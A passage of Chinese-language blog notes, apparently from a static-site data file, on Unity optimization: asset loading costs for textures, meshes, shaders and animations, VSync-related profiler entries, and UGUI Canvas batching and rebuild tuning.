href=\"#Unity纹理加载\" class=\"headerlink\" title=\"Unity纹理加载\"></a>Unity纹理加载</h1><p>资源加载、资源卸载、Object的实例化和代码的序列化是最耗时的</p>\n<ul>\n<li>资源加载,资源加载是加载模块中最为耗时的部分,CPU开销在Unity引擎中主要体现在Loading.UpdatePreloading和Loading.ReadObject两项中.<blockquote>\n<ul>\n<li>Loading.UpdatePreloading，这一项仅在调用类似LoadLevel（Async）的接口处出现,主要负责卸载当前场景的资源，并且加载下一场景中的相关资源和序列化信息等.下一场景中，自身所拥有的GameObject和资源越多，其加载开销越大。</li>\n<li>在很多项目中，存在另外一种加载方式，即场景为空场景，绝大部分资源和GameObject都是通过OnLevelWasLoaded回调函数中进行加载、实例化和拼合的。对于这种情况，Loading.UpdatePreloading的加载开销会很小。</li>\n<li>Loading.ReadObject，这一项记录的则是资源加载时的真正资源读取性能开销，基本上引擎的主流资源（纹理资源、网格资源、动画片段等等）读取均是通过该项来进行体现。可以说，这一项很大程度上决定了项目场景的切换效率。正因如此，我们就当前项目中所用的主流资源进行了大量的测试和分析，下面我们将分析结果与大家一起分享，希望可以帮到正在进行开发的你。</li>\n</ul>\n</blockquote>\n</li>\n<li>纹理资源,纹理资源是项目加载过程中开销占用最大的资源之一，其加载效率由其自身大小决定。决定纹理资源大小的因素主要有三种：分辨率、格式和Mipmap是否开启。<blockquote>\n<ul>\n<li>分辨率和格式是影响纹理资源加载效率的重要因素，因为这两项的设置对纹理资源的大小影响很大。1、纹理资源的分辨率对加载性能影响较大，分辨率越高，其加载越为耗时。设备性能越差，其耗时差别越为明显；2、设备越好，加载效率确实越高。但是，对于硬件支持纹理（ETC1/PVRTC）来说,中高端设备的加载效率差别已经很小，比如图中的红米Note2和三星S6设备，差别已经很不明显。</li>\n<li>纹理资源的格式对加载性能影响同样较大，Android平台上，ETC1和ETC2的加载效率最高。同样，iOS平台上，PVRTC 4BPP的加载效率最高。</li>\n<li>RGBA16格式纹理的加载效率同样很高，与RGBA32格式相比，其加载效率与ETC1/PVRTC非常接近，并且设备越好，加载开销差别越不明显；</li>\n<li>RGBA32格式纹理的加载效率受硬件设备的性能影响较大，ETC/PVRTC/RGBA16受硬件设备的影响较低。</li>\n<li>这里需要指出的是测试中所使用的ETC1和ETC2纹理均为RGB 4Bit格式,所以对于半透明纹理贴图，需要两张ETC1格式的纹理进行支持（一张RGB通道，一张Alpha通道）。逐一加载两张ETC1格式的纹理，其加载效率要低于RGBA16格式，但可以通过加载方式来进行弥补.</li>\n<li>开启Mipmap功能,开启Mipmap功能同样会增大一部分纹理大小，一般来说，其内存会增加至原始大小的1.33倍。开启Mipmap功能会导致资源加载更为耗时，且设备性能越差，其加载效率影响越大.<blockquote>\n<ul>\n<li>1、严格控制RGBA32和ARGB32纹理的使用，在保证视觉效果的前提下，尽可能采用“够用就好”的原则，降低纹理资源的分辨率，以及使用硬件支持的纹理格式。</li>\n<li>2、在硬件格式（ETC、PVRTC）无法满足视觉效果时，RGBA16格式是一种较为理想的折中选择，既可以增加视觉效果，又可以保持较低的加载耗时。</li>\n<li>3、严格检查纹理资源的Mipmap功能，特别注意UI纹理的Mipmap是否开启。在UWA测评过的项目中，有不少项目的UI纹理均开启了Mipmap功能，不仅造成了内存占用上的浪费，同时也增加了不小的加载时间。</li>\n<li>4、ETC2对于支持OpenGL ES3.0的Android移动设备来说，是一个很好的处理半透明的纹理格式。但是，如果你的游戏需要在大量OpenGL ES2.0的设备上进行运行，那么我们不建议使用ETC2格式纹理。因为不仅会造成大量的内存占用（ETC2转成RGBA32），同时也增加一定的加载时间。下图为测试2中所用的测试纹理在三星S3和S4设备上加载性能表现。可以看出，在OpenGL ES2.0设备上，ETC2格式纹理的加载要明显高于ETC1格式，且略高于RGBA16格式纹理。因此，建议研发团队在项目中谨慎使用ETC2格式纹理。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<hr>\n<h1 id=\"Unity网格加载模块\"><a href=\"#Unity网格加载模块\" class=\"headerlink\" title=\"Unity网格加载模块\"></a>Unity网格加载模块</h1><ul>\n<li>网格资源,网格资源与纹理资源一样，在加载时同样会造成较高的CPU占用，且其加载效率由其自身大小（网格数据量）决定。<blockquote>\n<ul>\n<li>不同面片数的网格资源加载效率测试,1、资源的数据量对加载性能影响较大，面片数越多，其加载越为耗时。设备性能越差，其耗时差别越为明显；2、随着硬件设备性能的提升，其加载效率差异越来越不明显。</li>\n<li>相同面片数、不同顶点属性的加载效率测试,1、顶点属性的增加对内存和AssetBundle包体大小影响较大。与测试1中未引入Tangent顶点属性的网格数据相比，测试2中的网格数据在内存上均大幅度增加（增加量与网格顶点数有关），且AssetBundle大小同样有成倍（1~2）的增加。2、顶点属性增加对于加载效率影响较大，且顶点数越多，影响越大。</li>\n<li>模型常见的顶点属性主要有Position、UV、Normal、Tangent和Color。Color属性与Tangent属性一样，如果网格顶点拥有该属性，同样会对内存、物理体积和加载性能造成影响。在使用Draw Call Batching时，不要将不同属性的网格模型拼合在一起。在使用Draw Call Batching时，切忌将不同属性的网格模型拼合在一起。举个例子 ，100个网格模型进行Static Batching，如果99个模型只有Position和UV两种属性，而剩下1个模型函数有Position、UV、Normal、Tangent和Color五种属性。那么引擎在进行拼合时，会将前99个模型的顶点属性补齐，然后再进行拼合。这样无形中会增加大量的内存占用，从而造成不必要的内存浪费。</li>\n<li>开启/关闭Read/Write功能的加载效率测试,1、关闭Read/Write功能会降低AssetBundle的物理大小，其降低量与资源本身数据量相关。同时，关闭Read/Write功能会大幅度降低网格资源的内存占用；2、关闭Read/Write功能会略微提升该资源的加载效率。<blockquote>\n<ul>\n<li>1、在保证视觉效果的前提下，尽可能采用“够用就好”的原则，即降低网格资源的顶点数量和面片数量；</li>\n<li>2、研发团队对于顶点属性的使用需谨慎处理。通过以上分析可以看出，顶点属性越多，则内存占用越高，加载时间越长；</li>\n<li>3、如果在项目运行过程中对网格资源数据不进行读写操作（比如Morphing动画等），那么建议将Read/Write功能关闭，既可以提升加载效率，又可以大幅度降低内存占用。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<hr>\n<h1 id=\"Unity-Shader-加载模块\"><a href=\"#Unity-Shader-加载模块\" class=\"headerlink\" title=\"Unity Shader 加载模块\"></a>Unity Shader 加载模块</h1><ul>\n<li>Shader资源与之前的网格资源和纹理资源不同，其本身物理Size很小。Shader资源的效率加载瓶颈并不在其自身大小的加载上，而是在Shader内容的解析上.<blockquote>\n<ul>\n<li>1、Shader资源的物理体积与内存占用虽然很小，但其加载耗时开销的CPU占用很高，这主要是因为Shader的解析CPU开销很高，成为了Shader资源加载的性能瓶颈；</li>\n<li>2、Mobile/Particles Additive在解析方面的耗时远小于Mobile/Diffuse、Mobile/Bumped Diffsue甚至Mobile/VertexLit;</li>\n<li>3、除Mobile/Particles Additive外，其他三个(Mobile-Diffuse，Mobile-VertexLit，Mobile-Bumped Diffuse)主流Shader在加载时均会造成明显的降帧，甚至卡顿。因此，研发团队应尽可能避免在非切换场景时刻进行Shader的加载操作；</li>\n<li>4、Mobile Shader较之同种Normal Shader在加载方面确实有一定的性能提升；</li>\n<li>5、Shader的加载开销经常在几百甚至上千毫秒以上,其加载耗时居然要高于几张Atlas纹理或者拥有上万片面的Mesh网格!!</li>\n</ul>\n</blockquote>\n</li>\n<li>Shader解析时的真正耗时原因    <blockquote>\n<ul>\n<li>一般情况下，Shader加载的CPU耗时与其Keyword数量有关，Keyword数量越多，则加载开销也越大。Shader的Keyword数量是会随着场景设置的不同而变化的。在Unity 5.x中，Unity默认会根据场景设置、Shader Pass等来调整Shader的Keyword，比如如果存在Lightmap的使用，则会默认将对应的Keyword打开，而对于没有使用Fog的项目，则会直接将相关Keyword关闭。</li>\n<li>对于Unity 5.x项目，可通过skip_variants操作在Shader中直接去除相关Keyword。</li>\n<li>直接去除Shader中的Fallback选项。Fallback功能是对于无法使用当前Shader的硬件设备可以使用对硬件设备要求更低的Fallback Shader来进行渲染，以保证渲染的稳定性。</li>\n</ul>\n</blockquote>\n</li>\n<li>Shader加载方式,5.x之后的Shader加载只是加载,加载之后还需要运行时编译,需要主动使用shader.WarmupAllShaders又或者ShaderVariantCollection.WarmUp来编译shader<blockquote>\n<ul>\n<li>大量相同Shader重复解析造成的。是因为Shader被打包到不同的AssetBundle文件中，每次切换场景时，AssetBundle均会被频繁地进行加载和卸载，从而造成了大量相同的Shader被重复加载和卸载。</li>\n<li>1、通过依赖关系打包，将项目中的所有Shader抽离并打成一个独立的AssetBundle文件，其他AssetBundle与其建立依赖；并对其进行预加载，以降低后续不必要的加载开销。</li>\n<li>2、Shader的AssetBundle文件在游戏启动后即进行加载并常驻内存，因为一款项目的Shader种类数量一般在50~100不等，且每个均很小，即便全部常驻内存，其内存总占用量也不会超过2MB；</li>\n<li>3、后续Prefab加载和实例化后，Unity引擎会通过AssetBundle之间的依赖关系直接找到对应的Shader资源进行使用，而不会再进行加载和解析操作。</li>\n<li>4、正在使用Resources.Load来加载资源的研发团队，可以尝试使用ShaderVariantCollection(着色器变体群,着色器资源列表，是一个由通道类型+着色器关键字组合的列表)来对Shader进行Preload,同样也可以达到避免相同Shader重复加载的效果。<a href=\"https://www.cnblogs.com/rexzhao/p/7884905.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/rexzhao/p/7884905.html</a></li>\n<li>5、在生成时剔除多余着色器变体, 1)个别着色器特性，比如使用 #pragma shader_feature的着色器，如果没有材质使用到了这个特性，那么就不会把它打包进去；2)没有被任何场景使用到的雾效(Fog)或光照贴图模式(Lightmap)的着色器变体，也不会打包进去。</li>\n<li>6.shader加载造成的卡顿有两种情况：1、着色器变种已经打包到APP中，只需要加载该变体，创建GPUProgram就可以了.2、着色器变种没用被打包，这时需要shaderlab文件进行解析和编译相应的变种，然后创建GUPProgram</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<hr>\n<h1 id=\"Unity动画加载模块\"><a href=\"#Unity动画加载模块\" class=\"headerlink\" title=\"Unity动画加载模块\"></a>Unity动画加载模块</h1><ul>\n<li>AnimationClip资源是项目运行时最常加载的资源之一，且其加载效率主要由其自身加载量决定，而决定AnimationClip资源加载量的主要因素则是它的压缩格式。<blockquote>\n<ul>\n<li>Unity引擎对导入的AnimationClip提供三种压缩格式，Off、Keyframe Reduction和Optimal。Off表示不采用压缩处理；Keyframe Reduction表示使用关键帧进行处理，Optimal则表示Unity引擎会根据动画曲线的特点来自动选择一个最优的压缩方式，可能是关键帧压缩，也可能是Dense压缩。<a href=\"https://docs.unity3d.com/Manual/class-Animator.html\" target=\"_blank\" rel=\"noopener\">https://docs.unity3d.com/Manual/class-Animator.html</a></li>\n<li>Optimal压缩方式确实可以提升资源的加载效率，无论是在高端机、中端机还是低端机上；</li>\n<li>硬件设备性能越好，其加载效率越高。但随着设备的提升，Keyframe Reduction和Optimal的加载效率提升已不十分明显；</li>\n<li>Optimal压缩方式可能会降低动画的视觉质量，因此，是否最终选择Optimal压缩模式，还需根据最终视觉效果的接受程度来决定。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<hr>\n<h1 id=\"Xcode-增量打包\"><a href=\"#Xcode-增量打包\" class=\"headerlink\" title=\"Xcode 增量打包\"></a>Xcode 增量打包</h1><p><a href=\"https://blog.uwa4d.com/archives/USparkle_iOS.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/USparkle_iOS.html</a></p>\n<hr>\n<h2 id=\"Overview-类型\"><a href=\"#Overview-类型\" class=\"headerlink\" title=\"Overview 类型\"></a>Overview 类型</h2><ul>\n<li>1 Profiler中WaitForTargetFPS详解 <a href=\"https://blog.csdn.net/suifcd/article/details/50942686\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/suifcd/article/details/50942686</a><br>该参数一般出现在 CPU开销过低，且通过设定了目标帧率的情况下（Application.targetFrameRate）。当上一帧低于目标帧率时，将会在本帧产生一个WaitForTargetFPS的空闲等待耗时，以维持目标帧率。<br>Gfx.WaitForPresent &amp;&amp; Graphics.PresentAndSync<br>这两个参数在Profiler中经常出现CPU占用较高的情况，且仅在发布版本中可以看到。究其原因，其实是CPU和GPU之间的垂直同步（VSync）导致的，之所以会有两种参数，主要是与项目是否开启多线程渲染有关。当项目开启多线程渲染时，你看到的则是Gfx.WaitForPresent；当项目未开启多线程渲染时，看到的则是Graphics.PresentAndSync。<br>Graphics.PresentAndSync 是指主线程进行Present时的等待时间和等待垂直同步的时间。Gfx.WaitForPresent其字面意思同样也是进行Present时需要等待的时间，但这里其实省略了很多的内容。其真实的意思应该是为了在渲染子线程（Rendering Thread）中进行Present，当前主线程（MainThread）需要等待的时间。</li>\n</ul>\n<p>当项目开启多线程程渲染时，引擎会将Present等相关工作尽可能放到渲染线程去执行，即主线程只需通过指令调用渲染线程，并让其进行Present，从而来降低主线程的压力。但是，当CPU希望进行Present操作时，其需要等待GPU完成上一次的渲染。如果GPU渲染开销很大，则CPU的Present操作将一直处于等待操作，其等待时间，即为当前帧的Gfx.WaitForPresent时间，如下图所示。<br><img src=\"/2020/05/08/Unity/Optimize/%E8%BD%AF%E4%BB%B6UWA%E4%BC%98%E5%8C%96/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%B8%B2%E6%9F%931.png\" alt=\"多线程渲染1\"></p>\n<p>同理，当项目未开启多线程渲染时，引擎会在主线程中进行Present(当前绝大多数的移动游戏均在使用该中操作)，当然，Present操作同样需要等待GPU完成上一次的渲染。如果GPU渲染开销很大，则CPU的Present操作将一直处于等待操作，其等待时间，即为当前帧的Graphics.PresentAndSync时间:<br><img src=\"/2020/05/08/Unity/Optimize/%E8%BD%AF%E4%BB%B6UWA%E4%BC%98%E5%8C%96/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%B8%B2%E6%9F%932.png\" alt=\"多线程渲染2\"><br>所以，如果你的项目中，Gfx.WaitForPresent或Graphics.PresentAndSync的CPU耗时非常高时，其实并不是它们自己做了什么神秘的操作，而是你当前的渲染任务太重，GPU负载过高所致。</p>\n<p>同时，对于开启垂直同步的项目而言，Gfx.WaitForPresent 和 Graphics.PresentAndSync也会出现CPU占用较高的情况。在解释这种问题之前，我们先以“大家乘坐地铁”来举个例子。一般来说，地铁到达每一站的时间均是平均且一定的，假设每10分钟一班接走一批乘客。但是几乎没有多少乘客可以按点到达，如果提前两分钟到达，则只需要等待两分钟即可乘上地铁，但是，如果你错过了，哪怕只差了一分钟，那么你也不得不再等待九分钟才能乘上地铁。</p>\n<p>上述的情况我们经常会遇到。在GPU的渲染流水线中，其转换front buffer和back buffer的工作原理和“乘坐地铁”其实是一致的。大家可以把GPU的流水线简单地想象成为一列地铁。对于移动设备来说，GPU的帧率一般为30帧/秒或60帧/秒，即VSync每33ms或每16.6ms“到站一次”，CPU的Present即为“乘客乘上地铁”，然后前往各自的目的地。与乘客的早到和晚到一样，CPU的Present也会出现类似的情况，比如：</p>\n<p>● CPU端开销非常小，Present在很早即被执行，但此时VSync还没到，则会出现较高的等待时间，即Gfx.WaitForPresent 和 Graphics.PresentAndSync的CPU开销看上去很高。<br>● CPU端开销很高，使得Present执行时错过了VSync操作，这样，Present将不得不等待下一次VSync的到来，从而造成了Gfx.WaitForPresent 和 Graphics.PresentAndSync的CPU开销较高。这种情况在CPU端加载过量资源时特别容易发生，比如WWW加载较大的AssetBundle、Resource.Load加载大量的Texture等等。</p>\n<p>通过以上的讲解，我们希望此刻的你已经对Gfx.WaitForPresent 和 Graphics.PresentAndSync已经有了深入的理解。这两个参数无论CPU占用多少，其实都不是这两个参数的自身问题，而是项目的其他部分造成。对此，我们做一个总结，以方便你进一步加深印象。</p>\n<p>造成这两个参数的CPU占用较高的原因主要有以下三种原因：</p>\n<pre><code>\n● CPU开销非常低，所以CPU在等待GPU完成渲染工作或等待VSync的到来；\n● CPU开销很高，使Present错过了当前帧的VSync，即不得不等待下一次VSync的到来；\n● GPU开销很高，CPU的Present需要等待GPU上一帧渲染工作的完成。    \n\n最后，如何优化并降低这两个参数的CPU占用呢？ 那就是，忽略Gfx.WaitForPresent 和 Graphics.PresentAndSync这两个参数，优化其他你能优化的一切！\n</code></pre><h1 id=\"UnityEngine-SetupCoroutine-InvokeMoveNext\"><a href=\"#UnityEngine-SetupCoroutine-InvokeMoveNext\" class=\"headerlink\" title=\"UnityEngine.SetupCoroutine:InvokeMoveNext\"></a>UnityEngine.SetupCoroutine:InvokeMoveNext</h1><hr>\n"},{"title":"1 Canvas","date":"2020-05-11T03:41:32.000Z","top":1,"_content":"\n# UGUI 介绍\n\n* 1 Unity 原生的 UI 系统,与 NGUI 的作者是一个,但是 UGUI 有官方的加持,意思就是,UGUI 的有些代码放在了 C++ 层管理,而 NGUI 是没有代码放在 C++ 层管理的.\n* 2 UGUI,NGUI都属于游戏运行时展示的 UI; UIWidgets 属于为 APP 设计的 UI ,用于APP 展示,和游戏关系不太大;FGUI 在 Unity,Coco,UE游戏引擎上面都可以使用.\n* 3 编辑器 UI,意思就是只在 Unity 编辑器里面搭建的UI,用于帮助工具,方便使用而创建的;有一套 GUI,已逐渐不再使用,就是在OnGui()函数里写的那些东西; IMGUI 则替代了GUI原来的作用：用于游戏调试和自定义Inspector面板,目前都使用 IMGUI;UI Element是 2019 版最新的 UI 系统,替代 IMGUI 而存在的;\n* 4 UGUI,NGUI,UI Element,IMGUI,GUI,UIWidgets,FGUI都可以使用,其中UGUI,NGUI,FGUI是一类,UI Element,IMGUI,GUI是一类,UIWidgets是一类;艹,耍我们就跟耍猴子一样,这么多 UI,UI 仔都不一定能全部了解.\n\n# RectTransform\n\n* 1 Pivot 轴心的概念,在RectTransform的 Inspector 展示的效果里面,是一个小圆,在某一点上面的一个蓝色的圆,轴心是相对于当前控件本身的位置,轴心的位置会影响旋转、大小调整或缩放的结果.一般情况下,轴心是在矩形框内部的;但是也有在外部的情况,这种情况不好控制,一般是旋转使用.矩形旋转围绕的轴心点的位置，定义为矩形本身大小的一个比例。0,0 相当于左下角，而 1,1 相当于右上角。\n* 2 Anchors 锚点的概念,在RectTransform的 Inspector 展示的效果里面,是 4 个花瓣,4 个花瓣可以分开,也就是说,锚点有 4 个,锚点是相对于当前控件的父控件来描述其相对位置的.用来解决,父控件进行的变换,对子控件的影响,当父控件进行旋转、大小调整或缩放,子控件也相应的进行旋转、大小调整或缩放.\n\n# UGUI 的 C++ 层\n* 1 有些控件表面上是属于 UGUI 的,但是在 UGUI 的源码里面又找不到其核心代码,只是在 C# 层暴漏了接口.\n* 2 Canvas.cs CanvasGroup.cs CanvasRender.cs 在 UGUI 的源码里面都看不见其核心代码,Canvas里面的方法可能会在子线程中执行\n\n# UI整体介绍\n\n* 1 可视化 UI : Text(文本),Image(图像),Raw Image(原始图像),Mask(遮罩);\n* 2 事件交互 UI : 按钮 (Button),开关 (Toggle),开关组 (Toggle Group),滑动条 (Slider),滚动条 (Scrollbar),下拉选单 (Dropdown),输入字段 (Input Field),滚动矩形/滚动视图 (Scroll Rect/Scroll View);\n* 3 自动布局:布局元素,Minimum width(最小宽度);Minimum height(最小高度);Preferred width(首选/偏好的宽度);Preferred height(首选/偏好的高度);Flexible width(灵活/最大的宽度);Flexible height(灵活/最大的高度); 布局组中的布局元素大小设置的基本原则如下:1)首先分配最小大小。2)如果有足够的可用空间，则分配偏好大小。3)如果有额外的可用空间，则分配灵活大小。布局元素组件(Layout Element),内容大小适配器 (Content Size Fitter),宽高比适配器 (Aspect Ratio Fitter)\n* 4 富文本\n\n# UGUI原理介绍\n\n* 1 Canvas Batch: Canvas下的UI元素最终都会被Batch到同一个Mesh中，而在Batch前，会根据这些UI元素的材质（通常就是Atlas）以及渲染顺序进行重排，在不改变渲染结果的前提下，尽可能将相同材质的UI元素合并在同一个SubMesh中，从而把DrawCall降到最低。Batch的结果会被缓存复用，直到这个Canvas被标记为dirty。\n* 2 影响合批的因素: Unity官方的重要提示：当给定Canvas上的任何可绘制UI元素发生更改时，Canvas必须重新执行合批过程。此过程重新分析Canvas上的每个可绘制UI元素，不管它是否被修改。注意，“更改”是指影响UI元素外观的任何变动，包括修改sprite renderer的sprite、transform的position和scale、文本网格的text等。\n* 3 Canvas嵌套：Canvas可以嵌套使用，一个子Canvas下dirty的子物体不会触发父Canvas的rebuild。\n\n* 4 UI顶点属性变化会引发网格更新:       \n修改Image、Text的color属性，会改变UIVertex.color;        \n修改RectTransform的Size、Anchors、Pivot等，会改变UIVertex.position;     \n注意：在UGUI中颜色的变化是通过修改顶点色实现的，避免生成了新的DrawCall;         \n注意：UIVertex.position记录的是本地空间下的坐标;            \n\n****\n\n![重建流程](重建流程.png)\n\n* 1 该过程由CanvasUpdateRegistry监听Canvas的WillRenderCanvases（上图中1）而执行,主要是对当前标记为dirty的layout和graphic执行rebuild。\n* 2 在rebuild layout之前会对Layout rebuild queue中的元素依据它们在heiarchy中的层次进行排序（上图中的2），排列的结果是越靠近根的节点越会被优先处理。\n* 3 rebuild layout（上图中的3）,主要是执行ILayoutElement和ILayoutController接口中的方法来计算位置，Rect的大小等布局信息。\n* 4 rebulid graphic（上图中的4）,主要是调用UpdateGeometry重建网格的顶点数据（上图中5）以及调用UpdateMeterial更新CanvasRender的材质信息（上图中6）。\n* 5 为什么在rebuild layout的时候，要优先处理根节点的元素?\n\n**** \n\n合批原理            \n\n* 1 UGUI的合批规则是进行重叠检测，然后分层合并。\n* 2 第一步计算每个UI元素的层级号(类似于 NGUI 的 Depth)：如果有一个UI元素，它所占的矩形范围内，如果没有任何UI在它的底下，那么它的层级号就是0（最底下）；如果有一个UI在其底下且该UI可以和它Batch，那它的层级号与底下的UI层级一样；如果有一个UI在其底下但是无法与它Batch，那它的层级号为底下的UI的层级+1；如果有多个UI都在其下面，那么按前两种方式遍历计算所有的层级号，其中最大的那个作为自己的层级号。\n* 3 第二步合并相同层级中可以Batch的元素作为一个批次，并对批次进行排序 ：有了层级号之后，Unity会将每一层的所有元素进行一个排序（按照材质、纹理等信息），合并掉可以Batch的元素成为一个批次。经过以上排序，就可以得到一个有序的批次序列了。这时Unity会再做一个优化，即如果相邻间的两个批次正好可以Batch的话就会进行Batch。合批的Batch数据，最后会分别放在CanvasMesh的SubMesh里。\n\n# 常见问题\n开发过程中四个常见的问题        \n过多的GPU片段着色器使用率（如屏幕填充率过高）       \n过多的CPU时间开销在重建一个画布上       \n过多的CPU时间开销在生成顶点上（通常是文本）     \n过多的画布重建次数      \n\n针对这四个问题来分组介绍优化策略        \n网格重建优化策略(优化 Mesh)        \n> * 1 使用尽可能少的UI元素：在制作UI时，一定要仔细查检UI层级，删除不必要的UI元素，这样可以减少深度排序的时间以及Rebuild的时间。\n> * 2 减少Rebuild的频率：将动态UI元素（频繁改变例如顶点、alpha、坐标和大小等的元素）与静态UI元素分离出来，放到特定的Canvas中。\n> * 3 谨慎使用UI元素的active操作：因为它们会触发耗时较高的rebuild。使用 Scale 代替.\n> * 4 谨慎使用Canvas的Pixel Perfect选项：该选项的开启会导致UI元素在发生位移时，其长宽会被进行微调（为了对齐像素），从而造成layout Rebuild。（比如ScrollRect滚动时，会使得Canvas.SendWillRenderCanvas消耗较高）\n> * 5 Animator最佳用法： Animator每帧都会改变元素，即使动画中的数值没有变化，因为Animator没有空指令检查。对于仅响应事件时才变化的元素，可以自行编写代码或使用第三方补间插件。换成 DoTween\n> * 6 谨慎用Tiled类型的Image\n\n屏幕填充率优化策略(OverDraw)      \n> * 1 禁用不可见的面板：比如当打开一个系统时如果完全挡住了另外一个系统，则可以将被遮挡住的系统面板禁用。（龙与少女优化方案：通过修改Canvas对象的Layer隐藏面板。）\n> * 2 不要使用空的Image做按键响应：在Unity中Raycast使用Graphic作为基本元素来检测touch。如果使用空的image也会产生不必要的overdraw。可以实现一个只在逻辑上响应Raycast但是不参与绘制的组件即可。使用网上的 Empty4Raycast 方案\n> * 3 Polygon Mode Sprites：如果图片边缘有大片留白就会产生很多无用填充。Unity和Texture Packer目前都支持了Polygon Mode，也就是说将原来的矩形Sprite用更加紧致的Polygon来描述。\n> * 4 Image Fill Center：在Image Type选项为Sliced的情况下，不需要Fill Center的时候去掉勾选。\n\n合批优化策略(DrawCall)        \n> * 1 相同层级原则：父节点下所有子节点，尽量保持相同的层次结构。相同层级下的UI元素可以Batch.\n> * 2 Mask组件：Mask组件使用了模版缓存，Mask中的UI元素无法与外界UI元素合批，Mask组件还会额外增加2个DrawCall.\n> * 3 隐藏的Image：Image组件中sprite为空，都是占用drawcall渲染的，并且还会打断前后元素的合批。\n> * 4 Screen Space-Camera模式：一个Canvas中的任何一个UI元素只要在屏幕中，则这个Canvas中的其他UI元素即使在屏幕外DrawCall仍不会减少。\n> * 5 Hierarchy穿插重叠问题：如下图红点和Icon在不同图集中，如果红点稍微大一点，遮挡了旁边的Icon，就不能合批，须要调整Icon和红点的节点关系，4个Icons放在一个节点下，4个红点放在一个借点下。\n\n字体优化策略(Font)        \n> * 1  字体图集的重建机制：当一个新文字出现的时候，会被添加到字体图集，如果图集已经没有空余的地方，那么图集会被重建。图集会以相同的尺寸重建，打包当前激活的所有UI text组件中要显示的文字，如果发现图集尺寸不够用的时候，图集会重新扩充尺寸。\n> * 2 后备字体机制：对于字体库里没有的文字，会被放进后备字体图集里，后背字体图集会常驻内存里，不会被销毁。后备字体取自于系统自带的系统字库Arial.ttf，在发布的游戏安装包里该字库是不存在的。我们在一些Unity开发的游戏里，偶尔会发现一些生僻字的字形和其它常见文字的字形不统一。\n> * 3 Text的网格重建：Text组件被重新启用的时候，会重建Text的网格。如果含有大量的文字，会造成严重的CPU开销。\n> * 4 提前生成动态字体：准备游戏非常常用的文字集合，通过Font.RequestCharactersInTexture接口提前放入字体图集里。注意使用Font.textureRebuilt 委托，在字体图集被重新重建的时候，把我们提前准备的文字集合再次添加进去。\n> * 5 使用美术数字：游戏的分数，可以使用美术数字（精灵图片）来代替Text组件\n> * 6 谨慎使用Text的Best Fit选项：虽然这个选项可以动态的调整字体大小以适应UI布局而不会超框，但其代价是很高的，Unity会为用到的该元素所用到的所有字号生成图元保存在图集里，不但增加额外的生成时间，还会使得字体对应的图集变大。\n> * 7 减少长文本Text的变动，慎用UI/Effect：描边和阴影效果都会增大四倍的顶点数\n\n滚动视图优化策划(ScrollView)        \n> * 1  有两种方法填充滚动视图:用所有需要出现在滚动视图的元素填充滚动视图(子控件很少的情况下使用).用池处理这些元素，根据需要重新放置它们的位置(子控件很多,或者无限的情况下使用)\n> * 2 RectMask2D组件：俩种方法可以通过给滚动视图添加一个RectMask2D组件来提高性能。该组件确保在滚动视图窗口外面的滚动视图元素不会出现在可画的元素列表中，省去了该元素的batch。\n> * 3 一种简单的缓存池策略：在UI中布局中，使用带有Layout Element组件的对象占位（ Slot ）。给可见UI元素实例一个池，来填充滚动视图看可见区域，Slot作为父物体来定位。\n> * 4 基于位置的缓存池策略：通过移动布局里UI元素的RectTransforms坐标值，来排序显示位置。通常写一个自定义的滚动视图类或者写一个自定义布局组的组件。\n\n其它优化策略        \n> * 1 禁用无用的Raycast：UGUI的touch处理消耗也可能会成为性能热点。因为UGUI在默认情况下会对所有可见的Graphic组件调用raycast。对于不需要接收touch事件的grahic，一定要禁用raycast。（龙与少女为策划提供了检视的辅助脚本）\n> * 2 OverrideSorting：子Canvas中的OverrideSorting属性将会造成Graphic Raycast测试停止遍历Transform层级。\n> * 3 UI对象的坐标Z值：Z值不为零的时候会影响对象渲染顺序并不能合批。（例如：龙与少女里的阵型界面都是修改Spine的SortingOrder来实现位置排序）\n> * 4 网格开销巨大：如果出现了WaitingForJob或PutGeometryJobFence，则说明合并网格开销巨大（子线程网格合并）\n> * 5 高级技巧：对于处于选中播放动画的需求，并且所处canvas下内容比较多的情况下，可以单独把选中对象放到预先建好的动态canvas里，取消选中时再放回去。\n> * 6 CanvasGroup的使用:在窗口的GameObject上添加一个CanvasGroup，通过控制它的Alpha值来淡入或淡出整个窗口;在窗口的GameObject上添加一个CanvasGroup，通过设置它Interactable值来控制底层所有控件的交互开关;在 UI 元素或其某个父元素上放置画布组 (Canvas Group) 组件并将其 Block Raycasts 属性设置为 false 来使一个或多个 UI 元素不阻止鼠标事件。\n> * 7 使用 Profiler 以及 FrameDebug 检测\n\n# 规范\n规范化的重要性：有规范就会有约束有限制，在一个团队的角度上来讲，大家遵守同一套规范，可以避免多余的沟通，增加开发效率，是保证团队协作、项目稳定推进的利器。\n\n设计模板：根据游戏风格和类型设计几套模板：尺寸(比如大中小三套)、布局(比如左右,左中右等)、样式(一级底+二级底+三级底)等，根据游戏内容选择模板，既保持UI统一，又能方便拼UI，大概百分之九十的窗口都在这几个模板中选择。其他比如充值等需要有表现力的窗口再自由设计尺寸和布局。\n\n路径一致性：美术UI目录和客户端目录保持一致，可以很方便替换新版UI，而不会出现名字不一致，目录不一致，策划找瞎眼的情况。\n\n图片命名：可以参考功能、颜色、尺寸等特点命名，命名尽量使用英文，可以添加前缀表示所属功能，后缀也可以使用拼音。\n\n公用图集：多个面板都会用到的图片放到公用图集里面。为了减少合批的障碍，有必要的时候，需要复制公共图片到单独的面板图集里。\n\n合理的出图尺寸：可以减小硬盘大小，减少第一次导入项目时的图片序列化时间。\n\n图片分类：图片可以根据用途分为UISprite、UIFrame 、 